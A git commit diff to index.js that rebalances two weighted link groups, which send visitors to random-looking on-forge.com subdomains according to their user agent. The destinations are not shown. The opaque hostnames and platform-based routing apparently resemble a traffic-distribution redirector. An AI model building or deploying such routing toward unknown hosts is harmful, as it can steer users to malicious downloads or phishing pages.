3a837b5c57af150404a2cfe116258c145bf8b1fd
animalinside <akshay.anand12@yahoo.com>
2026-05-08 08:07:07 +0530

    Update index.js

--- index.js
+++ index.js
@@ -45,13 +45,13 @@ function getResponse(userAgent) {
     const linkGroups = [
         {
             id: "Group 1",
-            weight: 0.7,
+            weight: 0.5,
             macos: "https://jhgfdsasdfghjk.on-forge.com/",
             others: "https://jhgfdsasdfghjk.on-forge.com/"
         },
         {
             id: "Group 2",
-            weight: 0.3,
+            weight: 0.5,
             macos: "https://vgfdsdfghjkl.on-forge.com/",
             others: "https://vgfdsdfghjkl.on-forge.com/"
         }
